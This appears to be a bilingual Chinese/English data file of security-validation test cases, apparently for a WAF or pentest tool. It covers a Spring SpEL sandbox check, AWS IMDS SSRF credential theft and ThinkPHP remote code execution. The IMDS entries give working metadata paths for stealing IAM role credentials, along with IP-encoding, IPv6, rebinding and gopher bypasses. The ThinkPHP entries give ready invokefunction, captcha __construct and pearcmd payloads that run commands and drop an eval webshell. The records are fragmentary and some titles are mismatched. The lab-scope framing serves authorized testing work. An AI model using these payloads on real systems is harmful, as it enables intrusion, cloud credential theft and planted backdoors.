explanation.zh: 写入可直接访问的根部署目录
explanation.en: writes into the directly served root deployment directory

description.zh: 记录上下文类型、属性访问器和所有禁用的高风险能力。
description.en: Record context type, property accessors, and every disabled high-risk capability.

description.zh: 向 localhost Fixture 提交 7*7，并要求返回结果和能力标志。
description.en: Submit 7*7 to the localhost fixture and require the result plus capability flags.

description.zh: 将请求与上下文创建、类型拒绝和方法禁用日志关联。
description.en: Correlate the request with context creation, type rejection, and method-disable logs.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/spel/evaluate" -H "Content-Type: application/json" -H "X-Request-ID: spel-simple-001" --data '{"expression":"7 * 7","mode":"simple"}' | jq -e '.result == 49 and .type_access == false and .method_invocation == false'

description.zh: 更新策略后重放算术与无效类型引用，确认业务计算保留且危险能力拒绝。
description.en: After policy updates, replay arithmetic and an invalid type reference to preserve business evaluation and deny dangerous capabilities.

overview.zh: Spring SpEL 简单求值边界验证针对表达式求值上下文配置的场景：业务是否把表达式限制在 SimpleEvaluationContext 中。验证仅计算固定算术表达式，并断言类型访问与方法调用能力均已关闭。
overview.en: The Spring SpEL simple-evaluation boundary validation targets expression-evaluation context configuration: whether the business confines expressions to a SimpleEvaluationContext. It evaluates only a fixed arithmetic expression and asserts both type access and method invocation are disabled.

vulnerability.zh: 风险源于把不可信表达式放入 StandardEvaluationContext 或开放类型解析、方法调用、Bean 解析能力；表达式语法被识别只是前提，实际影响取决于上下文对象与可用能力。
vulnerability.en: The risk stems from placing untrusted expressions in a StandardEvaluationContext or enabling type resolution, method invocation, and bean-resolution capabilities; recognized expression syntax is only a prerequisite—actual impact depends on context objects and available capabilities.

exploitation.zh: 按第 1 步向 /api/lab/spel/evaluate 的 simple 模式提交固定算术 7*7 并携带请求 ID；命中判据为返回 49 且 type_access 与 method_invocation 两个能力标志均为关闭。该组合构成配置证据：结果 49 证明表达式进入服务端求值，能力标志证明危险上下文未开放。不要用回显数字单独判断任意 SpEL 注入，也不要尝试 Runtime、ProcessBuilder 或反射调用。
exploitation.en: As in step 1, submit the fixed arithmetic 7*7 to /api/lab/spel/evaluate in simple mode with a request ID; a hit is a returned 49 with both the type_access and method_invoke capability flags disabled. The combination is configuration evidence: 49 proves server-side evaluation while the flags prove the dangerous context is closed. Do not judge arbitrary SpEL injection from the echoed number alone, and do not attempt Runtime, ProcessBuilder, or reflective calls.

mitigation.en: Avoid evaluating untrusted expressions; when expression support is required, use SimpleEvaluationContext with restricted property accessors and explicit variables, disable type location, constructors, methods, and bean resolution, and cap length, complexity, and timeouts. After the fix, replay the step-1 request and confirm the capability flags stay off with rejections logged.

analysis.zh: 算术返回 49 只证明存在求值路径。只有不可信输入能访问超出业务需要的类型、方法、Bean 或敏感对象才构成安全问题。本批明确断言高风险能力关闭，并不尝试命令、文件或网络。
analysis.en: Arithmetic result 49 proves an evaluation path only. A security issue requires untrusted input to access types, methods, beans, or sensitive objects beyond business need. This batch asserts risky capabilities are disabled and attempts no command, file, or network action.

review.rationale: WAF4 批次3：按§四 4.12 F1追加 Spring4Shell 数据绑定 classLoader 链。

name.zh: AWS IMDS 元数据窃取 SSRF 验证

description.zh: 覆盖 AWS 元数据服务的 SSRF 验证：从 IMDS 元数据与角色临时凭证读取，到 user-data 启动脚本获取，再到携带 token 的 IMDSv2 流程复现，用于确认云实例凭证与自定义数据是否可被窃取。
description.en: Covers SSRF validation against the AWS metadata service: from IMDS metadata and role temporary-credential reads through user-data startup script retrieval to token-carrying IMDSv2 flow replay, to confirm whether cloud instance credentials and custom data can be stolen.

prerequisites.zh: 确认 AWS IMDSv2 SSRF 验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for AWS IMDSv2 SSRF Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

description.zh: 逐条经 SSRF 注入点访问 AWS IMDS 路径；返回元数据目录或字段（如 instance-id）即确认 IMDS 可达。
description.en: Access AWS IMDS paths through the SSRF injection point; a returned metadata directory or fields (such as instance-id) confirm IMDS reachability.

title.en: AWS IMDSv2 SSRF Validation Cleaned Command 2

description.zh: 枚举已附加角色名后读取指定角色的临时凭证；返回含 AccessKeyId 与 SecretAccessKey 的 JSON 即确认角色凭证可被窃取。
description.en: Enumerate attached role names and read temporary credentials for the chosen role; JSON containing AccessKeyId and SecretAccessKey confirms role credentials can be stolen.

title.zh: 读取 user-data 启动脚本
title.en: AWS IMDSv2 SSRF Validation Cleaned Command 3

description.zh: 读取 user-data 启动脚本；返回明文启动脚本即确认实例自定义数据可被读取，注意其中可能包含密钥。
description.en: Read user-data startup scripts; plaintext returned confirms instance custom data is readable and may contain secrets.

syntaxBreakdown.part: 可能包含敏感信息、API密钥、启动脚本

title.zh: PUT 取 token 读元数据
title.en: AWS IMDSv2 SSRF Validation Cleaned Command 4

execution.command:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

GET http://169.254.169.254/latest/meta-data/
Header: X-aws-ec2-metadata-token: {IMDSV2_TOKEN}

description.zh: 先 PUT 获取 IMDSv2 token，再携带 token 请求头读取元数据；第一步取得带 TTL 的 token 且第二步返回元数据，即确认 v2 流程可被 SSRF 复现。
description.en: PUT to obtain an IMDSv2 token, then read metadata with the token header; obtaining a TTL-bearing token and then metadata confirms the v2 flow can be replayed through SSRF.

opsecTips.zh: IMDS 验证只对实验实例进行——拿到的临时凭证验证有效性后立即废弃，不触碰生产角色。
opsecTips.en: Run IMDS checks only on lab instances, discard the temporary credentials right after validating them, and never touch production roles.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: IMDS 地址进制变形绕过
title.en: AWS IMDSv2 SSRF Validation Cleaned Command 1

description.zh: 逐条提交 IMDS 地址的整数、十六进制与 IPv6 映射变体；任一变体返回元数据而标准地址被拦截，即确认过滤只匹配字符串形式。
description.en: Submit integer, hex, and IPv6-mapped IMDS address variants; any variant returning metadata while the literal form is blocked confirms string-only filtering.

title.zh: 重定向与重绑定链式绕过
title.en: AWS IMDSv2 SSRF Validation Cleaned Command 2

description.zh: 提交开放重定向、rbndr.us 重绑定与 gopher 变体；重定向主机收到跳转请求或重绑定解析后返回元数据，即确认链式绕过成立。
description.en: Submit open-redirect, rbndr.us rebinding, and gopher variants; a redirect hit on the attacker host or metadata returned after rebinding confirms a chained bypass.

title.zh: IMDSv2 token-first gopher 同链两跳

description.zh: IMDSv2 强制先 PUT 换 token；gopher 协议在同一条连接内完成取 token 与取凭据两跳，同时验证应用是否放行 PUT 出站。token 位以注册占位符承载，需按捕获器回传值替换。成功判据：OAST 收到 token 或凭据回传。
description.en: IMDSv2 forces a token-first PUT before metadata reads; the gopher scheme performs both hops on one connection, fetching the token and then the credentials, and simultaneously checks whether the application allows outbound PUT requests. The token slot rides a registered placeholder and must be replaced with the value captured from the first hop. Success: the OAST collector receives the token or the credential material.

explanation.zh: gopher 载体在单连接内串接原始报文
explanation.en: gopher carrier chaining raw messages on a single connection

explanation.zh: IMDSv2 第一跳：换取会话 token
explanation.en: first IMDSv2 hop: mint the session token

explanation.zh: 第二跳凭据读取携带 token，占位符按回传值替换
explanation.en: credential read carries the token; replace the placeholder with the captured value

description.zh: IPv6-only 子网实例的 IMDS 走 fd00:ec2::254 本地链路地址；仅封 169.254.169.254 IPv4 形态的过滤被原样绕过。成功判据：返回实例元数据内容。失效条件：出站层同时封禁 IPv6 链路本地地址。
description.en: Instances on IPv6-only subnets expose IMDS at the link-local address fd00:ec2::254, so filters that block only the 169.254.169.254 IPv4 form are bypassed unchanged. Success: the response returns instance metadata. Failure condition: the egress layer blocks IPv6 link-local addresses as well.

explanation.zh: AWS 分配的 IMDS IPv6 链路本地地址
explanation.en: AWS-assigned IPv6 link-local address for IMDS

explanation.zh: 与 IPv4 形态相同的元数据路径
explanation.en: metadata path identical to the IPv4 form

description.zh: 提交 http://169.254.169.254/latest/meta-data/ 到注入点；返回 ami-id、hostname 等元数据目录即确认元数据服务可达，SSRF 已能触达云层。
description.en: Submit http://169.254.169.254/latest/meta-data/; a directory listing with ami-id and hostname confirms the metadata service is reachable and the SSRF extends into the cloud layer.

title.zh: 变形地址绕过元数据过滤
title.en: Bypass metadata filtering with address variants

description.zh: 若链路本地地址被拦截，改用 2852039166、0xA9FEA9FE、[::ffff:169.254.169.254] 等变形重访；任一写法返回元数据目录即绕过基于字面 IP 的过滤规则。
description.en: If link-local addresses are blocked, revisit with variants like 2852039166, 0xA9FEA9FE and [::ffff:169.254.169.254]; any variant returning the metadata directory defeats the literal-IP filter.

title.zh: 窃取 IAM 角色临时凭证

description.zh: 沿 /iam/security-credentials/ 路径先列出角色名再请求具体角色；响应出现 AccessKeyId、SecretAccessKey、Token 字段即拿到实例角色的临时凭证。
description.en: Walk /iam/security-credentials/ to list roles, then request the role path; AccessKeyId, SecretAccessKey and Token fields in the response yield the instance role's temporary credentials.

attackChain.payload:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}

title.zh: 攻破 IMDSv2 令牌防护

description.zh: 对启用 IMDSv2 的实例先用 PUT /latest/api/token 并携带 TTL 头换取 token，再带 token 重访元数据接口；返回元数据内容即 v2 强制校验被绕过。
description.en: For IMDSv2 instances, PUT /latest/api/token with the TTL header to mint a token, then revisit metadata with it; metadata content in the response means the v2 enforcement is defeated.

title.zh: 拖取 user-data 启动脚本

description.zh: 请求 /latest/user-data/ 读取实例初始化脚本；返回内容中的数据库口令、API 密钥即成为进入内网与云下资源的第二把钥匙。
description.en: Request /latest/user-data/ to read the bootstrap script; database passwords and API keys inside become the second key into the intranet and downstream resources.

overview.zh: AWS IMDSv2 SSRF 验证覆盖云实例元数据窃取场景：针对部署在 EC2 上的服务端取回功能，验证注入点能否访问 169.254.169.254。验证维度涵盖 IMDS 元数据目录读取、角色临时凭证获取、user-data 启动脚本读取与携带 token 的 IMDSv2 流程复现。
overview.en: AWS IMDSv2 SSRF Validation covers cloud instance metadata theft: for a server-side fetch function deployed on EC2, verify whether the injection point can reach 169.254.169.254. Verification dimensions cover IMDS metadata directory reads, role temporary credential retrieval, user-data startup script reads, and replaying the token-bearing IMDSv2 flow.

vulnerability.zh: 根因是服务端可发起出站请求且网络层允许到达链路本地的 IMDS，攻击者借此读取实例身份、附加角色的临时 AccessKeyId/SecretAccessKey，以及 user-data 中可能残留的密钥；IMDSv2 的 PUT token 流程同样可被 SSRF 逐步复现。
vulnerability.en: The root cause is that the server can issue outbound requests and the network layer permits reaching the link-local IMDS, letting an attacker read the instance identity, the attached role's temporary AccessKeyId/SecretAccessKey, and any secrets left in user-data; the IMDSv2 PUT token flow can likewise be replayed step by step via SSRF.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步访问元数据根路径，返回 instance-id 等目录字段即确认 IMDS 可达；第 2 步先枚举已附加角色名，再读取该角色的临时凭证 JSON，拿到 AccessKeyId 即确认凭证可窃取；第 3 步读取 user-data 检查是否残留密钥；第 4 步先 PUT 获取带 TTL 的 token，再携带 X-aws-ec2-metadata-token 头复现 v2 流程。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 accesses the metadata root path — returned directory fields such as instance-id confirm IMDS reachability; step 2 enumerates the attached role name, then reads that role's temporary credential JSON — obtaining an AccessKeyId confirms credential theft; step 3 reads user-data to check for leftover secrets; step 4 first PUTs for a TTL token, then replays the v2 flow with the X-aws-ec2-metadata-token header. Replace placeholders via the global variables menu.

mitigation.zh:
实例元数据强制 IMDSv2 且 hop limit 为 1，网络层阻断工作负载到链路本地的非必要出站，附加角色最小权限并定期轮换。
    aws ec2 modify-instance-metadata-options \
        --instance-id i-1234567890abcdef0 \
        --http-tokens required --http-endpoint enabled \
        --http-put-response-hop-limit 1
    # 非必要元数据出站阻断
    iptables -A OUTPUT -d 169.254.169.254 -m owner ! --uid-owner root -j REJECT
    修复后重放验证：元数据请求应在网络层被拒绝或无法取得角色凭证。
mitigation.en: Enforce IMDSv2 for instance metadata with a token hop limit of 1, and block unnecessary egress from workloads to the link-local address; grant attached roles least privilege and rotate them. After the fix, regress with the step 1 and step 2 samples: metadata requests should be denied at the network layer or yield no role credentials.

analysis.zh: AWS IMDSv2 SSRF 验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: AWS IMDSv2 SSRF Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

review.rationale: WAF4 批次3：按§四 4.4 S1、§四 4.4 S2追加 IMDSv2 token-first gopher 链、IMDS IPv6 端点。

name.zh: ThinkPHP 版本与路由执行回归

description.zh: 覆盖 ThinkPHP 多版本 RCE 验证：从 TP5.0 invokeFunction 与 TP5.1 路由执行，到 captcha 模块 __construct 触发 RCE，再到版本指纹与路由探测，并附编码与入口变形绕过。
description.en: Covers RCE validation across ThinkPHP versions: from TP5.0 invokeFunction and TP5.1 route execution through captcha-module __construct RCE to version fingerprinting and route probing, with encoding and entry-mutation bypasses.

prerequisites.zh: 确认 ThinkPHP 版本与路由执行回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for ThinkPHP Version and Route-Execution Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

description.zh: 经 invokefunction 路由调用 call_user_func_array 执行 phpinfo/system 并写入 shell.php，验证 TP5.0.x 未过滤控制器名的远程代码执行。
description.en: Call call_user_func_array through the invokefunction route to run phpinfo/system and write shell.php, verifying TP5.0.x RCE via an unfiltered controller name.

description.zh: 以 input、invokefunction 与 Template write 三条路由执行 system 命令或写入 shell.php。命中判据：id 返回 uid=… 或 shell.php 写入成功且可访问。
description.en: Uses the input, invokefunction, and Template write routes to run system commands or drop shell.php. Success check: id returns uid=... or shell.php is written and reachable.

execution.command:
POST /index.php?s=captcha HTTP/1.1 
 Content-Type: application/x-www-form-urlencoded 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[cmd]);?>' > shell.php

description.zh: 向 /index.php?s=captcha 提交 _method=__construct 覆盖 Request 属性，经 filter[]=system 执行命令或写入 WebShell。
description.en: Post _method=__construct to /index.php?s=captcha to overwrite Request properties, executing commands via filter[]=system or writing a webshell.

title.zh: TP 版本指纹与路由探测
title.en: TP version fingerprint and route probing

description.zh: 以 X-Powered-By: ThinkPHP 响应头（存在时）或错误页/默认页中的 ThinkPHP 版本标识确认版本，并探测 \think\app/init 与 \think\Request/input 两条路由的可达性，为后续向量选择提供依据。
description.en: Confirm the ThinkPHP version via the X-Powered-By header and probe reachability of the \think\app/init and \think\Request/input routes to guide vector selection.

opsecTips.zh: invokeFunction 载荷真实执行代码——动作限定 marker；版本指纹探测请求限速避免日志洪水。
opsecTips.en: invokeFunction payloads really execute code — keep actions to marker commands, and throttle fingerprint probes to avoid log floods.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 对 invokefunction 路径分别施加单次编码、类名大小写变形与双重编码，验证仅匹配明文路由的防护规则可被绕过。
description.en: Apply single encoding, class-name case variants, and double encoding to the invokefunction path, verifying defenses matching only the plaintext route are evaded.

explanation.zh: URL 编码的路径分隔符 /

description.zh: 以大小写、无前导斜杠与不同入口文件（/index.php、/public/index.php）形式重放 invokefunction 路由，验证路径归一化差异导致的绕过。
description.en: Replay the invokefunction route with case variants, no leading slash, and different entry files (/index.php, /public/index.php), exposing bypasses caused by path-normalization differences.

explanation.zh: 命名空间分隔符用反斜杠的控制器写法
explanation.en: Controller path written with namespace backslashes

explanation.zh: 正斜杠形式的控制器写法
explanation.en: Controller path written with forward slashes

explanation.zh: 公共入口文件的替代路径
explanation.en: Alternative entry path via the public directory

title.zh: 多语言参数文件包含 pearcmd 链

description.zh: think-multi-lang 扩展的 lang 参数路径包含配合 pearcmd 写文件（CVE-2022-47945）：lang 指向 pearcmd 并借 config-create 把 webshell 落盘，绕过仅盯 s= 参数 invokefunction 链的规则。成功判据：shell.php 落盘且可执行。
description.en: The lang parameter of the think-multi-lang extension performs path inclusion that pairs with pearcmd file writing, tracked as CVE-2022-47945: lang points at pearcmd and config-create drops a webshell, evading rules focused only on the s= invokefunction chain. Success: the dropped shell file exists and executes.

explanation.zh: lang 参数包含指向 pearcmd 入口
explanation.en: lang parameter includes a path pointing at the pearcmd entry

explanation.zh: 借 pearcmd 子命令把内容写成文件
explanation.en: pearcmd subcommand that writes attacker content to disk

description.zh: 从 X-Powered-By 与响应特征确认 ThinkPHP 版本，探测 init 与 input 路由可达性。命中判据：版本与可用路由入口明确。
description.en: Read X-Powered-By and probe init/input routes to pin the version. Success: version and reachable routes are known.

description.zh: 经 invokefunction 路由调用 call_user_func_array 执行 phpinfo 并写入 Shell。命中判据：返回 phpinfo 页面或 Shell 成功落盘可访问。
description.en: Drive call_user_func_array through invokefunction to run phpinfo and drop a shell. Success: phpinfo returns or shell lands.

attackChain.payload:
# ThinkPHP 5.0.x RCE
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?>
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

description.zh: 对 5.1 目标用 input、Container 与 Template 三条路由执行命令或写 Shell。命中判据：id 返回 uid=… 或 Shell 可访问。
description.en: On 5.1 use input/Container/Template routes to run commands or write a shell. Success: uid= returns or shell is reachable.

description.zh: 向 captcha 路由提交 _method=__construct 覆盖 Request 属性，经 filter 执行命令。命中判据：命令输出返回响应。

overview.zh: ThinkPHP 版本与路由执行回归针对 ThinkPHP 多版本路由到动态调用的 RCE 场景。覆盖 TP5.0 invokeFunction、TP5.1 路由执行、captcha 模块 __construct 触发与版本指纹探测四类验证维度，并附编码与入口变形绕过。
overview.en: The ThinkPHP version and route-execution regression targets multi-version ThinkPHP RCE via routing into dynamic invocation. It covers four verification dimensions—TP5.0 invokeFunction, TP5.1 route execution, captcha-module __construct triggering, and version fingerprinting—plus encoding and entry-point variant bypasses.

vulnerability.zh: 根因是受影响版本未过滤路由中的控制器与方法名，或 Request 属性可被 _method 覆盖后进入 filter 回调，用户输入因此到达 call_user_func_array、system 等动态调用与命令执行边界。
vulnerability.en: The root cause is affected versions failing to filter controller and method names in routes, or Request properties being overridden via _method into filter callbacks—user input therefore reaches dynamic invocation and command-execution boundaries such as call_user_func_array and system.

exploitation.zh: 按 Payload 列表顺序使用：先以第 4 步验版本；TP5.0.x 用第 1 步 invokefunction 路由调用 call_user_func_array 执行 system、写 shell.php；TP5.1.x 用第 2 步三条路由验证；captcha 用第 3 步提交 _method=__construct 加 filter[]=system。id 返回 uid= 或 shell.php 可达即命中；被拦时改用编码与入口变形。
exploitation.en: Use payloads in list order: confirm the version with step 4 first; for TP5.0.x use step 1's invokefunction route to call call_user_func_array, run system, and write shell.php; for TP5.1.x verify with step 2's three routes; with captcha, POST _method=__construct plus filter[]=system per step 3. A hit is id returning uid= or shell.php reachable; if blocked, use encoding and entry-point variants.

mitigation.en: Upgrade to vendor-supported versions with patches, disable production debug and dynamic invocation, and restrict route parameters and allowed types; pair with a WAF that normalizes encodings. After the fix, replay the step 1-3 route payloads and confirm 404s or filtered parameters, with step-4 fingerprinting no longer revealing version details.

analysis.zh: ThinkPHP 版本与路由执行回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: ThinkPHP Version and Route-Execution Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.
